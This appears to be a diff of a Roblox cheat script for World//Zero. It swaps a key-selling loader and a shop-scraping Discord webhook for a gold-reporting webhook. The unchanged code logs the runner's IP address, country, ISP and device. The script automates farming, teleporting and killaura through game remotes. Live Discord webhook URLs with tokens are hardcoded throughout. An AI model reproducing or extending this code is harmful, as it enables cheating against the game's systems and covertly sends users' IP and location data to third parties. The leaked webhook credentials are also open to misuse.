@@ -1,316 +1,72 @@
-
-
-task.spawn(function()
-    local player = game.Players.LocalPlayer
-    local gui = Instance.new("ScreenGui")
-    gui.Parent = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0.4, 0, 0.3, 0) -- A little smaller
-    frame.Position = UDim2.new(0.3, 0, 0.15, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(255, 223, 230)
-    frame.BackgroundTransparency = 1
-    frame.BorderSizePixel = 0
-    frame.Parent = gui
-
-    local border = Instance.new("UIStroke")
-    border.Thickness = 3
-    border.Color = Color3.fromRGB(255, 255, 255)
-    border.Parent = frame
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0.25, 0)
-    corner.Parent = frame
-
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, -20, 0.4, 0)
-    textLabel.Position = UDim2.new(0, 10, 0, 5)
-    textLabel.BackgroundTransparency = 1
-    textLabel.Text = "🔑 Key: 0.5$ / 10.000 VND / 20M (1 week) 💖\n🔑 Buy now to unlock script!"
-    textLabel.Font = Enum.Font.FredokaOne
-    textLabel.TextSize = 18
-    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    textLabel.TextStrokeTransparency = 0
-    textLabel.TextStrokeColor3 = Color3.fromRGB(255, 105, 180)
-    textLabel.TextWrapped = true
-    textLabel.TextYAlignment = Enum.TextYAlignment.Center
-    textLabel.Parent = frame
-
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(0.55, 0, 0.12, 0) -- Smaller
-    button.Position = UDim2.new(0.225, 0, 0.55, 0)
-    button.BackgroundColor3 = Color3.fromRGB(255, 180, 200)
-    button.Text = "📋 Copy Discord Link"
-    button.Font = Enum.Font.FredokaOne
-    button.TextSize = 14 -- Slightly smaller font
-    button.TextColor3 = Color3.fromRGB(255, 255, 255)
-    button.Parent = frame
-
-    local buttonStroke = Instance.new("UIStroke")
-    buttonStroke.Thickness = 2
-    buttonStroke.Color = Color3.fromRGB(255, 105, 180)
-    buttonStroke.Parent = button
-
-    local buttonCorner = Instance.new("UICorner")
-    buttonCorner.CornerRadius = UDim.new(0.3, 0)
-    buttonCorner.Parent = button
-
-    button.MouseEnter:Connect(function()
-        button.BackgroundColor3 = Color3.fromRGB(255, 160, 190)
-    end)
-
-    button.MouseLeave:Connect(function()
-        button.BackgroundColor3 = Color3.fromRGB(255, 180, 200)
-    end)
-
-    button.MouseButton1Click:Connect(function()
-        setclipboard("https://discord.gg/A5aDk94a")
-        button.Text = "✅ Copied!"
-        button.BackgroundColor3 = Color3.fromRGB(255, 130, 160)
-        task.wait(1.5)
-        button.Text = "📋 Copy Discord Link"
-        button.BackgroundColor3 = Color3.fromRGB(255, 180, 200)
-    end)
-
-    -- 🔥 Loading Script Text (Moved Below Discord Button)
-    local loadingLabel = Instance.new("TextLabel")
-    loadingLabel.Size = UDim2.new(1, 0, 0.1, 0)
-    loadingLabel.Position = UDim2.new(0, 0, 0.7, 0) -- Re-align
-    loadingLabel.BackgroundTransparency = 1
-    loadingLabel.Text = "⏳ Loading Script..."
-    loadingLabel.Font = Enum.Font.FredokaOne
-    loadingLabel.TextSize = 16
-    loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    loadingLabel.TextStrokeTransparency = 0
-    loadingLabel.TextStrokeColor3 = Color3.fromRGB(255, 105, 180)
-    loadingLabel.Parent = frame
-
-    -- 🔥 Progress Bar (Countdown Timer)
-    local progressFrame = Instance.new("Frame")
-    progressFrame.Size = UDim2.new(0.8, 0, 0.08, 0)
-    progressFrame.Position = UDim2.new(0.1, 0, 0.85, 0)
-    progressFrame.BackgroundColor3 = Color3.fromRGB(255, 200, 220)
-    progressFrame.BorderSizePixel = 0
-    progressFrame.Parent = frame
-
-    local progressBar = Instance.new("Frame")
-    progressBar.Size = UDim2.new(1, 0, 1, 0) -- Initially full
-    progressBar.BackgroundColor3 = Color3.fromRGB(255, 130, 160)
-    progressBar.BorderSizePixel = 0
-    progressBar.Parent = progressFrame
-
-    local progressCorner = Instance.new("UICorner")
-    progressCorner.CornerRadius = UDim.new(0.4, 0)
-    progressCorner.Parent = progressFrame
-
-    local progressBarCorner = Instance.new("UICorner")
-    progressBarCorner.CornerRadius = UDim.new(0.4, 0)
-    progressBarCorner.Parent = progressBar
-
-    local TweenService = game:GetService("TweenService")
-    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
-    local goal = {Size = UDim2.new(0, 0, 1, 0)}
-    local tween = TweenService:Create(progressBar, tweenInfo, goal)
-
-    -- 🌟 Fade-in effect
-    for i = 1, 20 do
-        frame.BackgroundTransparency = 1 - (i * 0.05)
-        textLabel.TextTransparency = 1 - (i * 0.05)
-        loadingLabel.TextTransparency = 1 - (i * 0.05)
-        button.TextTransparency = 1 - (i * 0.05)
-        task.wait(0.05)
-    end
-
-    -- ⏳ Run progress bar
-    tween:Play()
-
-    -- ⏳ Wait 20 seconds
-    tween.Completed:Wait()
-
-    -- 🌙 Fade-out effect (Synchronized time)
-    for i = 1, 40 do
-        local transparencyStep = i * 0.025
-        frame.BackgroundTransparency = transparencyStep
-        textLabel.TextTransparency = transparencyStep
-        loadingLabel.TextTransparency = transparencyStep
-        button.TextTransparency = transparencyStep
-        progressBar.BackgroundTransparency = transparencyStep
-        progressFrame.BackgroundTransparency = transparencyStep
-        task.wait(0.05)
-    end
-
-    gui:Destroy()
-end)
-wait(1)
-pcall(function()
-    keypress(0x50) -- 0x50 is the ASCII code for the P key
-    wait(0.1)
-    keyrelease(0x50)
-end)
--- Convert Color3 to integer for embed
-local function color3ToDecimal(color)
-    local r = math.floor(color.R * 255)
-    local g = math.floor(color.G * 255)
-    local b = math.floor(color.B * 255)
-    return (r * 256^2) + (g * 256) + b
-end
-
--- Convert Color3 to hex code
-local function color3ToHex(color)
-    local r = math.floor(color.R * 255)
-    local g = math.floor(color.G * 255)
-    local b = math.floor(color.B * 255)
-    return string.format("#%02X%02X%02X", r, g, b)
-end
--- Wait indefinitely until ServerName appears in the GUI
-local function waitForServerName()
-    local Players = game:GetService("Players")
-    local player = Players.LocalPlayer
-    local gui = player:WaitForChild("PlayerGui", 10)
-
-    while true do
-        local serverNameLabel = gui:FindFirstChild("ServerName", true)
-        if serverNameLabel and serverNameLabel:IsA("TextLabel") then
-            return serverNameLabel
-        end
-        task.wait(1)
-    end
-end
-
--- Get ServerName and ID from PlayerGui
-local function getServerDetails()
-    local serverNameLabel = waitForServerName()
-    if serverNameLabel then
-        local fullText = serverNameLabel.Text
-        local serverNameOnly, serverID = fullText:match("^(.-)%s%-%s.*rgb%([^%)]+%)\">(.-)</font>$")
-        return serverNameOnly or "Không rõ", serverID or "Không rõ"
-    else
-        return "Không rõ", "Không rõ"
-    end
-end
-
-
--- Webhook URL
-local webhookUrl = "https://discord.com/api/webhooks/1358010037003616368/ZHJ1cKMIBhrq4KQAI5mqfQOZFgjDNeU4y-PO5mFJ7ta86hOW5mUtiC4zXyr4Dn0Zjh8d"
-
--- Function to send information via webhook
-local function sendWebhook(serverName, serverID, shopName, ownerName, isActive, itemName, itemInfo, color, hexColor)
-    local OSTime = os.time()
-    local Time = os.date('!*t', OSTime)
-
-    local embed = {
-        title = "Item Information in PlayerShop",
-        description = string.format("Server Name: **%s**\nServer ID: **%s**\nShop: **%s**\nShop Owner: **%s**\nStatus: **%s**",
-                                    serverName, serverID, shopName, ownerName, isActive and "Open" or "Closed"),
-        color = color or 65280, -- Default color: green
-        fields = {
-            { name = "Item Name", value = string.format("**%s**", itemName) },
-        },
-        footer = { text = "Sent from Roblox game" },
-        timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
-    }
-
-    -- Add detailed information to the embed
-    for _, detail in ipairs(itemInfo) do
-        table.insert(embed.fields, { name = detail.name, value = detail.value, inline = true })
-    end
-
-    -- Add color code information (hex) to the embed
-    if hexColor then
-        table.insert(embed.fields, { name = "Color (hex)", value = string.format("`%s`", hexColor), inline = false })
-    end
-
-    -- Send request to webhook
-    local httpService = game:GetService("HttpService")
-    local success, err = pcall(function()
-        (syn and syn.request or http_request)({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-            },
-            Body = httpService:JSONEncode({
-                content = "🌸Found a new item in the shop🌸",
-                embeds = { embed },
-            }),
-        })
-    end)
-
-    if not success then
-        warn("Webhook sending failed:", err)
-    end
-end
-
--- Function to iterate through items and send information via webhook
-local function sendItems()
-    local serverName, serverID = getServerDetails() -- Get server information
-    print("Server name:", serverName, "ID server:", serverID)
-
-    local replicatedStorage = game:GetService("ReplicatedStorage")
-    local playerShops = replicatedStorage:FindFirstChild("PlayerShops")
-
-    if not playerShops then
-        warn("PlayerShops does not exist in ReplicatedStorage.")
-        return
-    end
-
-    for _, player in ipairs(playerShops:GetChildren()) do
-        local shop = player:FindFirstChild("SellShop")
-        if shop then
-            local shopNameValue = shop:FindFirstChild("ShopName")
-            local activeValue = shop:FindFirstChild("Active")
-            local shopName = shopNameValue and shopNameValue.Value or "Không rõ"
-            local isActive = activeValue and activeValue.Value or false
-
-            local items = shop:FindFirstChild("Items")
-            if items then
-                for _, item in ipairs(items:GetChildren()) do
-                    local itemName = item.Name
-                    local itemInfo = {}
-                    local color
-                    local hexColor
-
-                    -- Process items with Dye
-                    local dye = item:FindFirstChild("Dye")
-                    if dye and dye:IsA("Color3Value") then
-                        color = color3ToDecimal(dye.Value)
-                        hexColor = color3ToHex(dye.Value)
-                        table.insert(itemInfo, {
-                            name = "Color",
-                            value = hexColor,
-                        })
-
-                        -- Collect other detailed information of the item
-                        for _, detail in ipairs(item:GetChildren()) do
-                            if detail:IsA("IntValue") or detail:IsA("NumberValue") then
-                                table.insert(itemInfo, {
-                                    name = detail.Name,
-                                    value = tostring(detail.Value),
-                                })
-                            end
-                        end
-
-                        -- Send item information via webhook
-                        sendWebhook(serverName, serverID, shopName, player.Name, isActive, itemName, itemInfo, color, hexColor)
-                    end
-                end
-            end
-        end
-    end
-end
-
--- Run continuous loop
-task.spawn(function()
-    while true do
-        sendItems()
-        task.wait(60)
-    end
-end)
+wait(20)
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
+-- WEBHOOK
+local HttpService = game:GetService('HttpService')
+local Players = game:GetService('Players')
 
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png'
+local Content = '<@880845879404285952> Treo Acc World//Zero AnyaTeam' -- Nội dung có tag role
+local player = Players.LocalPlayer
+local playerName = player.Name
 
+-- Hàm gửi embed
+local function sendEmbed(goldValue)
+    local currentTime = os.time()
+    local timeData = os.date('!*t', currentTime)
+    
+    local Embed = {
+        title = 'World//Zero',
+        color = 99999,
+        footer = { text = game.JobId },
+        author = {
+            name = 'MAI HOÀNG PHI',
+            url = 'https://www.roblox.com/',
+        },
+        fields = {
+            {
+                name = playerName,
+                value = tostring(goldValue)
+            },
+            {
+                name = 'NGÀY VÀ GIỜ',
+                value = os.date('%Y-%m-%d %H:%M:%S', currentTime)
+            }
+        },
+        timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', timeData.year, timeData.month, timeData.day, timeData.hour, timeData.min, timeData.sec),
+    }
+
+    (syn and syn.request or http_request) {
+        Url = 'https://discord.com/api/webhooks/1366249100760059915/VkEi882cb9zKazZ-gYISAdJfu9KBxDW3sZwZk5QnhWlJdxHprpGXhCMxTV8wALNtkFpY',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = HttpService:JSONEncode({
+            content = Content,
+            allowed_mentions = {
+                parse = {"roles"}
+            },
+            embeds = {Embed}
+        })
+    }
+end
+
+-- Coroutine để kiểm tra liên tục
+coroutine.wrap(function()
+    while task.wait(10) do -- Chờ 10s mỗi lần
+        local playerProfile = player:FindFirstChild("PlayerGui"):FindFirstChild("Profile")
+        if playerProfile and playerProfile:FindFirstChild("Currency") and playerProfile.Currency:FindFirstChild("Gold") then
+            local goldValue = playerProfile.Currency.Gold.Value
+            if goldValue == 99999999 then -- Kiểm tra nhỏ hơn hoặc bằng 10 triệu
+                sendEmbed(goldValue)
+            end
+        end
+    end
+end)()
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -329,12 +85,12 @@ end
 
 -- ip log
 local ipInfo = SafeHttpGet("https://ipwho.is/") or {}
-local ip = ipInfo.ip or "🔒 | Unknown"
-local country = ipInfo.country or "🌍 | Unknown"
-local provider = ipInfo.connection and ipInfo.connection.isp or "📶 | Unknown"
+local ip = ipInfo.ip or "🔒 | Không xác định"
+local country = ipInfo.country or "🌍 | Không rõ"
+local provider = ipInfo.connection and ipInfo.connection.isp or "📶 | Không rõ"
 
 -- device
-local platform = "❓ | Unknown"
+local platform = "❓ | Không rõ"
 if UserInputService.TouchEnabled then
     platform = "📱 | Mobile"
 elseif UserInputService.KeyboardEnabled then
@@ -595,8 +351,9 @@ if R:FindFirstChild("ActiveMission") then
         {"Guardian", "UpdateSpeed"},
         {"Paladin", "LightThurst"},
         {"Paladin", "GuildedLight"},
-        {"MageOfLight", "Infuse", 6} -- Add a 3rd parameter for a separate cooldown
+        {"MageOfLight", "Infuse", 6} -- Thêm tham số thứ 3 là thời gian chờ riêng
     }
+
     task.spawn(function()
         local lastInfuseTime = 0 -- Biến để theo dõi thời gian sử dụng Infuse
         
@@ -608,7 +365,7 @@ if R:FindFirstChild("ActiveMission") then
                 if action == "Infuse" then
                     local currentTime = tick()
                     if currentTime - lastInfuseTime < (customCooldown or 1) then
-                        goto continue -- Bỏ qua vòng lặp này nếu chưa đủ thời gian chờ
+                        continue -- Bỏ qua vòng lặp này nếu chưa đủ thời gian chờ
                     else
                         lastInfuseTime = currentTime -- Cập nhật thời gian sử dụng
                     end
@@ -626,35 +383,32 @@ if R:FindFirstChild("ActiveMission") then
                         skillAction:FireServer()
                     end
                 end
-                ::continue::
             end
             task.wait(1) -- Vẫn chờ 1 giây trước vòng lặp kế tiếp cho các kỹ năng khác
         end
     end)
-else
-    return
 end
-
 if R:FindFirstChild("ActiveMission") then
     ao = true;
     ai = game:GetService("Workspace"):WaitForChild("MissionObjects")
     aj = R:WaitForChild("MissionScripts")
     ak = R:WaitForChild("ActiveMission").Value;
     aa.Dungeon = R:WaitForChild("ActiveMission").Value;
-    do
-        if table.find(am, ak) then
-            at = true
-        elseif ak == 38 then
-            au = true
-        elseif ak == 46 then
-            ax = true
-        elseif ak == 39 then
-            av = true
-        else
-            ar = true;
-            al = S.Missions.GetDifficulty:InvokeServer()
-            aa.Difficulty = S.Missions.GetDifficulty:InvokeServer()
-        end
+    if table.find(am, ak) then
+        at = true
+    elseif ak == 38 then
+        au = true
+    elseif ak == 46 then
+    -- tuỳ bạn đặt tên biến, miễn code ở dưới chạy vào check
+    aX = true 
+    ax = true
+
+    elseif ak == 39 then
+        av = true
+    else
+        ar = true;
+        al = S.Missions.GetDifficulty:InvokeServer()
+        aa.Difficulty = S.Missions.GetDifficulty:InvokeServer()
     end
     if ak == 23 then
         as = true
@@ -941,10 +695,10 @@ local c3 = {
     'MinibossExit', 'ArenaEntry0', 'ArenaEntry1', 'ArenaEntry2'
 }
 
--- Flag to check so that BossDoorTrigger is not added twice
+-- Cờ kiểm tra để không thêm BossDoorTrigger trùng
 local isBossDoorAdded = false
 
--- Function to handle TouchInterest
+-- Hàm xử lý TouchInterest
 local function ProcessAllTouchInterests()
     local Players = game:GetService("Players")
     local LocalPlayer = Players.LocalPlayer or Players:GetPlayers()[1]
@@ -967,12 +721,12 @@ local function ProcessAllTouchInterests()
                     end)
                 end
             end
-            print("Processed all TouchInterest in c3 after adding BossDoorTrigger")
+            print("Đã xử lý tất cả TouchInterest trong c3 sau khi thêm BossDoorTrigger")
         end
     end
 end
 
--- Check ak before using
+-- Kiểm tra ak trước khi dùng
 if ak ~= nil then
     if ak == 43 then
         table.remove(c3, table.find(c3, 'WaveStarter'))
@@ -985,14 +739,14 @@ if ak ~= nil then
         if not table.find(c3, "BossTrigger") then  
             table.insert(c3, "BossTrigger")
             ProcessAllTouchInterests()
-            print("Added part to c3")
+            print("Đã thêm part vào c3")
         end
     end
 else
-    warn("ak (ActiveMission) does not exist, may be in the menu.")
+    warn("ak (ActiveMission) chưa tồn tại, có thể đang ở menu.")
 end
 
--- If BossDoorTrigger has not been added, check periodically
+-- Nếu chưa thêm BossDoorTrigger thì kiểm tra định kỳ
 if not isBossDoorAdded then
     task.spawn(function()
         while true do
@@ -1008,7 +762,7 @@ if not isBossDoorAdded then
                             if not table.find(c3, "BossDoorTrigger") then
                                 table.insert(c3, "BossDoorTrigger")
                                 isBossDoorAdded = true
-                                print("Added BossDoorTrigger due to FINAL FLOOR.")
+                                print("Đã thêm BossDoorTrigger do FINAL FLOOR.")
                                 ProcessAllTouchInterests()
                                 break
                             end
@@ -1076,7 +830,7 @@ local c5 = {
     AetherTower = {
         Id = 34,
         priorityTbl = {'ForestMoose','ForestRaptor', 'VaneAetherDragon'},
-        clearMobsFirst = true  -- New flag variable
+        clearMobsFirst = true  -- Biến cờ mới
     },
     ArcaneTower = {
         Id = 43,
@@ -4745,10 +4499,10 @@ do
                 local bossMobs = {}
                 local normalMobs = {}
                 
-                -- Classify mobs and bosses
+                -- Phân loại mob và boss
                 for B, C in pairs(b9:GetChildren()) do
                     if isAlive(C) then
-                        -- Classify bosses and regular mobs
+                        -- Phân loại boss và mob thường
                         if string.match(C.Name, "BOSS") or string.match(C.Name, "Dragon") then
                             table.insert(bossMobs, C)
                         else
@@ -4758,12 +4512,12 @@ do
                     end
                 end
                 
-                -- If the clearMobsFirst flag is enabled and there are regular mobs, prioritize regular mobs
+                -- Nếu cờ clearMobsFirst được bật và có mob thường, ưu tiên mob thường
                 if clearMobsFirst and #normalMobs > 0 then
                     en, eo = normalMobs[1], normalMobs[1].Name
                     ep = true
                 else
-                    -- Initial priority logic
+                    -- Logic ưu tiên ban đầu
                     for B = 1, #em do
                         for ds, Mob in pairs(eq) do
                             if Mob.Name == em[B] then
@@ -4817,13 +4571,13 @@ do
     end
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer or Players:GetPlayers()[1] 
-local movedToTimer = false -- only run once
+local movedToTimer = false -- chỉ chạy 1 lần duy nhất
 
 function AutoCheckpoint()
     task.spawn(function()
         while Toggles.Autofarm.Value do
             if alive() then
-                -- Check if BossDoorTrigger has been added
+                -- Kiểm tra nếu BossDoorTrigger đã được thêm
                 if not isBossDoorAdded then
                     local character = LocalPlayer.Character
                     if character then
@@ -4833,31 +4587,31 @@ function AutoCheckpoint()
                             local missionStart = missionObjects and missionObjects:FindFirstChild("MissionStart")
                             local missionTimer = missionStart and missionStart:FindFirstChild("MissionTimer")
                             local surfaceGui = missionTimer and missionTimer:FindFirstChild("SurfaceGui")
-                            local collider = missionStart and ( missionStart:FindFirstChild("Collider") or missionStart:FindFirstChild("Part") )
+                            local collider = missionStart and missionStart:FindFirstChild("Collider")
                             local timerLabel = surfaceGui and surfaceGui:FindFirstChild("Timer")
 
                             local shouldSkip = false
 
-                            -- Only check Timer once
+                            -- Chỉ kiểm tra Timer 1 lần
                             if not movedToTimer and timerLabel and timerLabel:IsA("TextLabel") then
-                                if timerLabel.Text == "--" and collider then
+                                if timerLabel.Text == "--" and collider and collider:IsA("BasePart") then
                                     hrp.CFrame = collider.CFrame + Vector3.new(0, 5, 0)
                                     movedToTimer = true
                                     shouldSkip = true
-                                    warn("✅ Teleported to Timer checkpoint")
+                                    warn("✅ Đã dịch chuyển đến Timer checkpoint")
                                     task.wait(1)
                                 end
                             end
 
                             if not shouldSkip then
-                                -- Get Title.Text from WaveStartGate
+                                -- Lấy Title.Text từ WaveStartGate
                                 local waveGate = missionObjects and missionObjects:FindFirstChild("WaveStartGate")
                                 local gateTimer = waveGate and waveGate:FindFirstChild("MissionTimer")
                                 local gateGui = gateTimer and gateTimer:FindFirstChild("SurfaceGui")
                                 local titleLabel = gateGui and gateGui:FindFirstChild("Title")
                                 local isWaiting = (titleLabel and titleLabel:IsA("TextLabel") and titleLabel.Text == "Waiting for players")
 
-                                -- Teleport to WaveExitModel if still in "Waiting for players" state
+                                -- Dịch chuyển đến WaveExitModel nếu vẫn còn trong trạng thái "Waiting for players"
                                 local waveExit = missionObjects and missionObjects:FindFirstChild("WaveExitModel")
                                 if isWaiting and waveExit then
                                     local meshPart = waveExit:FindFirstChild("MeshPart")
@@ -4867,7 +4621,7 @@ function AutoCheckpoint()
                                     end
                                 end
 
-                                -- Teleport to WaveStartGate if it exists
+                                -- Dịch chuyển đến WaveStartGate nếu có
                                 if waveGate then
                                     local targetPart = waveGate:FindFirstChild("Collider")
                                     if targetPart then
@@ -4877,7 +4631,7 @@ function AutoCheckpoint()
                                 end
                             end
 
-                            -- Handle TouchInterest if BossDoorTrigger has not been added
+                            -- Xử lý TouchInterest nếu chưa thêm BossDoorTrigger
                             for _, C in pairs(workspace:GetDescendants()) do
                                 if C and C.Name == "TouchInterest" and C.Parent and
                                     (table.find(c3, C.Parent.Name) or (C.Parent.Parent and table.find(c3, C.Parent.Parent.Name))) then
@@ -4896,7 +4650,7 @@ function AutoCheckpoint()
                         end
                     end
                 else
-                    -- If BossDoorTrigger has been added, just wait 1 second and do nothing
+                    -- Nếu BossDoorTrigger đã được thêm, chỉ đợi 1 giây và không làm gì cả
                     task.wait(1)
                 end
 
@@ -6163,16 +5917,16 @@ Toggles.Killaura:OnChanged(function(cU)
             task.wait()
         end
     end)
--- Create args beforehand and reuse them
+-- Tạo args trước và tái sử dụng
 local defaultArgs = {
-    [1] = nil, -- Will be assigned the skill name
-    [2] = nil, -- Position or other data
-    [4] = 3    -- Fixed value
+    [1] = nil, -- Sẽ được gán là tên kỹ năng
+    [2] = nil, -- Vị trí hoặc dữ liệu khác
+    [4] = 3    -- Giá trị cố định
 }
 
 task.spawn(function()
     while Toggles.Killaura.Value and ao do
-        -- Get the nearest mob
+        -- Lấy mob gần nhất
         X, Y, Z, _, a0, a1, a2 = getClosestMob(bV)
         if alive() and not mounted() and X and not table.find(bl, aZ) then
             for _, gx in pairs(ca[aZ].Skills) do
@@ -6181,7 +5935,7 @@ task.spawn(function()
                 local gD, ge = gy == 'Ranged' and a1 and Z or Y, gy == 'Ranged' and a0 or _
                 
                 if tick() - (gx.LastUsed or 0) >= gB then
-                    -- Update args based on skill type
+                    -- Cập nhật args dựa trên loại kỹ năng
                     defaultArgs[1] = gx.Skill
                     if gy == 'Melee' then
                         defaultArgs[2] = aG.Position
